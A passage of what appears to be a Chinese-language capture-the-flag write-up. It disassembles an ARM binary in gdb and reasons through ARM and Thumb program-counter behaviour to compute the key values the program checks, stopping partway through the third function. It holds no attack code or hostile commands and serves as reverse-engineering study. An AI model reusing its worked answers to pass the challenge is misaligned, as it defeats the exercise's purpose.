</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="no">disass</span> <span class="no">main</span>
<span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">main</span><span class="p">:</span>
   <span class="err">0</span><span class="nf">x00008d3c</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">push</span>    <span class="err">{</span><span class="no">r4</span><span class="p">,</span> <span class="no">r11</span><span class="p">,</span> <span class="no">lr</span><span class="err">}</span>
   <span class="err">0</span><span class="nf">x00008d40</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">add</span> <span class="no">r11</span><span class="p">,</span> <span class="no">sp</span><span class="p">,</span> <span class="c">#8
</span><span class="c"></span>   <span class="mi">0x00008d44</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">sub</span> <span class="no">sp</span><span class="p">,</span> <span class="no">sp</span><span class="p">,</span> <span class="c">#12
</span><span class="c"></span>   <span class="mi">0x00008d48</span> <span class="err">&lt;+</span><span class="mi">12</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span> <span class="no">r3</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span>   <span class="mi">0x00008d4c</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">str</span> <span class="no">r3</span><span class="p">,</span> <span class="p">[</span><span class="no">r11</span><span class="p">,</span> <span class="c">#-16]
</span><span class="c"></span>   <span class="mi">0x00008d50</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ldr</span> <span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">pc</span><span class="p">,</span> <span class="c">#104]  ; 0x8dc0 &lt;main+132&gt;
</span><span class="c"></span>   <span class="mi">0x00008d54</span> <span class="err">&lt;+</span><span class="mi">24</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">bl</span>  <span class="mh">0xfb6c</span> <span class="p">&lt;</span><span class="no">printf</span><span class="p">&gt;</span>
   <span class="err">0</span><span class="nf">x00008d58</span> <span class="err">&lt;+</span><span class="mi">28</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span> <span class="no">r3</span><span class="p">,</span> <span class="no">r11</span><span class="p">,</span> <span class="c">#16
</span><span class="c"></span>   <span class="mi">0x00008d5c</span> <span class="err">&lt;+</span><span class="mi">32</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ldr</span> <span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">pc</span><span class="p">,</span> <span class="c">#96]   ; 0x8dc4 &lt;main+136&gt;
</span><span class="c"></span>   <span class="mi">0x00008d60</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span> <span class="no">r1</span><span class="p">,</span> <span class="no">r3</span>
   <span class="err">0</span><span class="nf">x00008d64</span> <span class="err">&lt;+</span><span class="mi">40</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">bl</span>  <span class="mh">0xfbd8</span> <span class="p">&lt;</span><span class="no">__isoc99_scanf</span><span class="p">&gt;</span>
   <span class="err">0</span><span class="nf">x00008d68</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">bl</span>  <span class="mh">0x8cd4</span> <span class="p">&lt;</span><span class="no">key1</span><span class="p">&gt;</span>
   <span class="err">0</span><span class="nf">x00008d6c</span> <span class="err">&lt;+</span><span class="mi">48</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span> <span class="no">r4</span><span class="p">,</span> <span class="no">r0</span>
   <span class="err">0</span><span class="nf">x00008d70</span> <span class="err">&lt;+</span><span class="mi">52</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">bl</span>  <span class="mh">0x8cf0</span> <span class="p">&lt;</span><span class="no">key2</span><span class="p">&gt;</span>
   <span class="err">0</span><span class="nf">x00008d74</span> <span class="err">&lt;+</span><span class="mi">56</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span> <span class="no">r3</span><span class="p">,</span> <span class="no">r0</span>
   <span class="err">0</span><span class="nf">x00008d78</span> <span class="err">&lt;+</span><span class="mi">60</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span> <span class="no">r4</span><span class="p">,</span> <span class="no">r4</span><span class="p">,</span> <span class="no">r3</span>
   <span class="err">0</span><span class="nf">x00008d7c</span> <span class="err">&lt;+</span><span class="mi">64</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">bl</span>  <span class="mh">0x8d20</span> <span class="p">&lt;</span><span class="no">key3</span><span class="p">&gt;</span>
   <span class="err">0</span><span class="nf">x00008d80</span> <span class="err">&lt;+</span><span class="mi">68</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span> <span class="no">r3</span><span class="p">,</span> <span class="no">r0</span>
   <span class="err">0</span><span class="nf">x00008d84</span> <span class="err">&lt;+</span><span class="mi">72</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span> <span class="no">r2</span><span class="p">,</span> <span class="no">r4</span><span class="p">,</span> <span class="no">r3</span>
   <span class="err">0</span><span class="nf">x00008d88</span> <span class="err">&lt;+</span><span class="mi">76</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ldr</span> <span class="no">r3</span><span class="p">,</span> <span class="p">[</span><span class="no">r11</span><span class="p">,</span> <span class="c">#-16]
</span><span class="c"></span>   <span class="mi">0x00008d8c</span> <span class="err">&lt;+</span><span class="mi">80</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span> <span class="no">r2</span><span class="p">,</span> <span class="no">r3</span>
   <span class="err">0</span><span class="nf">x00008d90</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">bne</span> <span class="mh">0x8da8</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">108</span><span class="p">&gt;</span>
   <span class="err">0</span><span class="nf">x00008d94</span> <span class="err">&lt;+</span><span class="mi">88</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ldr</span> <span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">pc</span><span class="p">,</span> <span class="c">#44]   ; 0x8dc8 &lt;main+140&gt;
</span><span class="c"></span>   <span class="mi">0x00008d98</span> <span class="err">&lt;+</span><span class="mi">92</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">bl</span>  <span class="mh">0x1050c</span> <span class="p">&lt;</span><span class="no">puts</span><span class="p">&gt;</span>
   <span class="err">0</span><span class="nf">x00008d9c</span> <span class="err">&lt;+</span><span class="mi">96</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ldr</span> <span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">pc</span><span class="p">,</span> <span class="c">#40]   ; 0x8dcc &lt;main+144&gt;
</span><span class="c"></span>   <span class="mi">0x00008da0</span> <span class="err">&lt;+</span><span class="mi">100</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">bl</span>  <span class="mh">0xf89c</span> <span class="p">&lt;</span><span class="no">system</span><span class="p">&gt;</span>
   <span class="err">0</span><span class="nf">x00008da4</span> <span class="err">&lt;+</span><span class="mi">104</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">b</span>   <span class="mh">0x8db0</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">116</span><span class="p">&gt;</span>
   <span class="err">0</span><span class="nf">x00008da8</span> <span class="err">&lt;+</span><span class="mi">108</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">ldr</span> <span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">pc</span><span class="p">,</span> <span class="c">#32]   ; 0x8dd0 &lt;main+148&gt;
</span><span class="c"></span>   <span class="mi">0x00008dac</span> <span class="err">&lt;+</span><span class="mi">112</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">bl</span>  <span class="mh">0x1050c</span> <span class="p">&lt;</span><span class="no">puts</span><span class="p">&gt;</span>
   <span class="err">0</span><span class="nf">x00008db0</span> <span class="err">&lt;+</span><span class="mi">116</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">mov</span> <span class="no">r3</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span>   <span class="mi">0x00008db4</span> <span class="err">&lt;+</span><span class="mi">120</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="no">r3</span>
   <span class="err">0</span><span class="nf">x00008db8</span> <span class="err">&lt;+</span><span class="mi">124</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">sub</span> <span class="no">sp</span><span class="p">,</span> <span class="no">r11</span><span class="p">,</span> <span class="c">#8
</span><span class="c"></span>   <span class="mi">0x00008dbc</span> <span class="err">&lt;+</span><span class="mi">128</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">pop</span> <span class="err">{</span><span class="no">r4</span><span class="p">,</span> <span class="no">r11</span><span class="p">,</span> <span class="no">pc</span><span class="err">}</span>
   <span class="err">0</span><span class="nf">x00008dc0</span> <span class="err">&lt;+</span><span class="mi">132</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">andeq</span>   <span class="no">r10</span><span class="p">,</span> <span class="no">r6</span><span class="p">,</span> <span class="no">r12</span><span class="p">,</span> <span class="no">lsl</span> <span class="c">#9
</span><span class="c"></span>   <span class="mi">0x00008dc4</span> <span class="err">&lt;+</span><span class="mi">136</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">andeq</span>   <span class="no">r10</span><span class="p">,</span> <span class="no">r6</span><span class="p">,</span> <span class="no">r12</span><span class="p">,</span> <span class="no">lsr</span> <span class="c">#9
</span><span class="c"></span>   <span class="mi">0x00008dc8</span> <span class="err">&lt;+</span><span class="mi">140</span><span class="err">&gt;</span><span class="p">:</span>           <span class="c">; &lt;UNDEFINED&gt; instruction: 0x0006a4b0
</span><span class="c"></span>   <span class="mi">0x00008dcc</span> <span class="err">&lt;+</span><span class="mi">144</span><span class="err">&gt;</span><span class="p">:</span>           <span class="c">; &lt;UNDEFINED&gt; instruction: 0x0006a4bc
</span><span class="c"></span>   <span class="mi">0x00008dd0</span> <span class="err">&lt;+</span><span class="mi">148</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">andeq</span>   <span class="no">r10</span><span class="p">,</span> <span class="no">r6</span><span class="p">,</span> <span class="no">r4</span><span class="p">,</span> <span class="no">asr</span> <span class="c">#9
</span><span class="c"></span><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="no">disass</span> <span class="no">key1</span>
<span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">key1</span><span class="p">:</span>
   <span class="err">0</span><span class="nf">x00008cd4</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">push</span>    <span class="err">{</span><span class="no">r11</span><span class="err">}</span>       <span class="c">; (str r11, [sp, #-4]!)
</span><span class="c"></span>   <span class="mi">0x00008cd8</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">add</span> <span class="no">r11</span><span class="p">,</span> <span class="no">sp</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span>   <span class="mi">0x00008cdc</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">mov</span> <span class="no">r3</span><span class="p">,</span> <span class="no">pc</span>
   <span class="err">0</span><span class="nf">x00008ce0</span> <span class="err">&lt;+</span><span class="mi">12</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="no">r3</span>
   <span class="err">0</span><span class="nf">x00008ce4</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span> <span class="no">sp</span><span class="p">,</span> <span class="no">r11</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span>   <span class="mi">0x00008ce8</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span> <span class="err">{</span><span class="no">r11</span><span class="err">}</span>       <span class="c">; (ldr r11, [sp], #4)
</span><span class="c"></span>   <span class="mi">0x00008cec</span> <span class="err">&lt;+</span><span class="mi">24</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">bx</span>  <span class="no">lr</span>
<span class="nf">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="no">disass</span> <span class="no">key2</span>
<span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">key2</span><span class="p">:</span>
   <span class="err">0</span><span class="nf">x00008cf0</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">push</span>    <span class="err">{</span><span class="no">r11</span><span class="err">}</span>       <span class="c">; (str r11, [sp, #-4]!)
</span><span class="c"></span>   <span class="mi">0x00008cf4</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">add</span> <span class="no">r11</span><span class="p">,</span> <span class="no">sp</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span>   <span class="mi">0x00008cf8</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">push</span>    <span class="err">{</span><span class="no">r6</span><span class="err">}</span>        <span class="c">; (str r6, [sp, #-4]!)
</span><span class="c"></span>   <span class="mi">0x00008cfc</span> <span class="err">&lt;+</span><span class="mi">12</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span> <span class="no">r6</span><span class="p">,</span> <span class="no">pc</span><span class="p">,</span> <span class="c">#1
</span><span class="c"></span>   <span class="mi">0x00008d00</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">bx</span>  <span class="no">r6</span>
   <span class="err">0</span><span class="nf">x00008d04</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span> <span class="no">r3</span><span class="p">,</span> <span class="no">pc</span>
   <span class="err">0</span><span class="nf">x00008d06</span> <span class="err">&lt;+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">adds</span>    <span class="no">r3</span><span class="p">,</span> <span class="c">#4
</span><span class="c"></span>   <span class="mi">0x00008d08</span> <span class="err">&lt;+</span><span class="mi">24</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>    <span class="err">{</span><span class="no">r3</span><span class="err">}</span>
   <span class="err">0</span><span class="nf">x00008d0a</span> <span class="err">&lt;+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span> <span class="err">{</span><span class="no">pc</span><span class="err">}</span>
   <span class="err">0</span><span class="nf">x00008d0c</span> <span class="err">&lt;+</span><span class="mi">28</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span> <span class="err">{</span><span class="no">r6</span><span class="err">}</span>        <span class="c">; (ldr r6, [sp], #4)
</span><span class="c"></span>   <span class="mi">0x00008d10</span> <span class="err">&lt;+</span><span class="mi">32</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="no">r3</span>
   <span class="err">0</span><span class="nf">x00008d14</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span> <span class="no">sp</span><span class="p">,</span> <span class="no">r11</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span>   <span class="mi">0x00008d18</span> <span class="err">&lt;+</span><span class="mi">40</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span> <span class="err">{</span><span class="no">r11</span><span class="err">}</span>       <span class="c">; (ldr r11, [sp], #4)
</span><span class="c"></span>   <span class="mi">0x00008d1c</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">bx</span>  <span class="no">lr</span>
<span class="nf">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="no">disass</span> <span class="no">key3</span>
<span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">key3</span><span class="p">:</span>
   <span class="err">0</span><span class="nf">x00008d20</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">push</span>    <span class="err">{</span><span class="no">r11</span><span class="err">}</span>       <span class="c">; (str r11, [sp, #-4]!)
</span><span class="c"></span>   <span class="mi">0x00008d24</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">add</span> <span class="no">r11</span><span class="p">,</span> <span class="no">sp</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span>   <span class="mi">0x00008d28</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">mov</span> <span class="no">r3</span><span class="p">,</span> <span class="no">lr</span>
   <span class="err">0</span><span class="nf">x00008d2c</span> <span class="err">&lt;+</span><span class="mi">12</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="no">r3</span>
   <span class="err">0</span><span class="nf">x00008d30</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span> <span class="no">sp</span><span class="p">,</span> <span class="no">r11</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span>   <span class="mi">0x00008d34</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span> <span class="err">{</span><span class="no">r11</span><span class="err">}</span>       <span class="c">; (ldr r11, [sp], #4)
</span><span class="c"></span>   <span class="mi">0x00008d38</span> <span class="err">&lt;+</span><span class="mi">24</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">bx</span>  <span class="no">lr</span>
<span class="nf">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>上面的代码让我有些懵逼, 加上 ssh 连上题目服务器后一大堆调试信息铺面而来,
不过退出的时候看见了 qemu-system-arm 字样, 冷静分析过后我总算是明白了: 这次的平台是arm</p>
<p>用不了 F5 了&hellip;.</p>
<h2 id="arm汇编简介">ARM汇编简介</h2>
<p>先来学习一下arm汇编</p>
<ul>
<li>pc 保存着即将执行的指令的地址</li>
<li>r3 保存函数返回值(写起来像是这样的)</li>
<li>r0 保存函数返回值(反汇编的结果好像是这样的)</li>
<li>#  是常量标识符</li>
<li>lr 保存着调用者调用完自己后应该执行的下一条指令的地址(调用者的pc)</li>
</ul>
<h2 id="key1">key1</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">0</span><span class="nf">x00008cd4</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">push</span>    <span class="err">{</span><span class="no">r11</span><span class="err">}</span>       <span class="c">; (str r11, [sp, #-4]!)
</span><span class="c"></span><span class="mi">0x00008cd8</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">add</span> <span class="no">r11</span><span class="p">,</span> <span class="no">sp</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span><span class="mi">0x00008cdc</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">mov</span> <span class="no">r3</span><span class="p">,</span> <span class="no">pc</span>
<span class="err">0</span><span class="nf">x00008ce0</span> <span class="err">&lt;+</span><span class="mi">12</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="no">r3</span>
<span class="err">0</span><span class="nf">x00008ce4</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span> <span class="no">sp</span><span class="p">,</span> <span class="no">r11</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span><span class="mi">0x00008ce8</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span> <span class="err">{</span><span class="no">r11</span><span class="err">}</span>       <span class="c">; (ldr r11, [sp], #4)
</span><span class="c"></span><span class="mi">0x00008cec</span> <span class="err">&lt;+</span><span class="mi">24</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">bx</span>  <span class="no">lr</span>
</code></pre></td></tr></table>
</div>
</div><p>r3 的值就是 pc 的值, pc的值在执行 <code>mov r3, pc</code> 时为 0x8cdc + 0x8.
(arm流水作业特性, 没看懂&hellip;)</p>
<p>总之最终返回 0x8ce4</p>
<h2 id="key2">key2</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">0</span><span class="nf">x00008cf0</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">push</span>    <span class="err">{</span><span class="no">r11</span><span class="err">}</span>       <span class="c">; (str r11, [sp, #-4]!)
</span><span class="c"></span><span class="mi">0x00008cf4</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">add</span> <span class="no">r11</span><span class="p">,</span> <span class="no">sp</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span><span class="mi">0x00008cf8</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">push</span>    <span class="err">{</span><span class="no">r6</span><span class="err">}</span>        <span class="c">; (str r6, [sp, #-4]!)
</span><span class="c"></span><span class="mi">0x00008cfc</span> <span class="err">&lt;+</span><span class="mi">12</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span> <span class="no">r6</span><span class="p">,</span> <span class="no">pc</span><span class="p">,</span> <span class="c">#1
</span><span class="c"></span><span class="mi">0x00008d00</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">bx</span>  <span class="no">r6</span>
<span class="err">0</span><span class="nf">x00008d04</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span> <span class="no">r3</span><span class="p">,</span> <span class="no">pc</span>
<span class="err">0</span><span class="nf">x00008d06</span> <span class="err">&lt;+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">adds</span>    <span class="no">r3</span><span class="p">,</span> <span class="c">#4
</span><span class="c"></span><span class="mi">0x00008d08</span> <span class="err">&lt;+</span><span class="mi">24</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>    <span class="err">{</span><span class="no">r3</span><span class="err">}</span>
<span class="err">0</span><span class="nf">x00008d0a</span> <span class="err">&lt;+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span> <span class="err">{</span><span class="no">pc</span><span class="err">}</span>
<span class="err">0</span><span class="nf">x00008d0c</span> <span class="err">&lt;+</span><span class="mi">28</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span> <span class="err">{</span><span class="no">r6</span><span class="err">}</span>        <span class="c">; (ldr r6, [sp], #4)
</span><span class="c"></span><span class="mi">0x00008d10</span> <span class="err">&lt;+</span><span class="mi">32</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="no">r3</span>
<span class="err">0</span><span class="nf">x00008d14</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span> <span class="no">sp</span><span class="p">,</span> <span class="no">r11</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span><span class="mi">0x00008d18</span> <span class="err">&lt;+</span><span class="mi">40</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span> <span class="err">{</span><span class="no">r11</span><span class="err">}</span>       <span class="c">; (ldr r11, [sp], #4)
</span><span class="c"></span><span class="mi">0x00008d1c</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">bx</span>  <span class="no">lr</span>
</code></pre></td></tr></table>
</div>
</div><p>首先 <code>add r6, pc, #1</code> , r6的值为 <code>0x8cfc + 8 + 1=0x8d05</code></p>
<p><code>bx r6</code> 跳转到r6表示的地址, 并且根据最低位(1/0)判断进入(thumb/arm)模式, 这个地方显然是进入 thumb 状态</p>
<p>下面两行使 r3=0x8d04+0x4+4 , 由于thumb模式下一条指令两个字节, 所以这次pc只+0x4</p>
<p>然后就这么执行下去, 最终返回 0x08d0c</p>
<h2 id="key3">key3</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">0</span><span class="nf">x00008d20</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">push</span>    <span class="err">{</span><span class="no">r11</span><span class="err">}</span>       <span class="c">; (str r11, [sp, #-4]!)
</span><span class="c"></span><span class="mi">0x00008d24</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">add</span> <span class="no">r11</span><span class="p">,</span> <span class="no">sp</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span><span class="mi">0x00008d28</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">mov</span> <span class="no">r3</span><span class="p">,</span> <span class="no">lr</span>
<span class="err">0</span><span class="nf">x00008d2c</span> <span class="err">&lt;+</span><span class="mi">12</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="no">r3</span>
<span class="err">0</span><span class="nf">x00008d30</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span> <span class="no">sp</span><span class="p">,</span> <span class="no">r11</span><span class="p">,</span> <span class="c">#0
</span><span class="c"></span><span class="mi">0x00008d34</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span> <span class="err">{</span><span class="no">r11</span><span class="err">}</span>       <span class="c">; (ldr r11, [sp], #4)
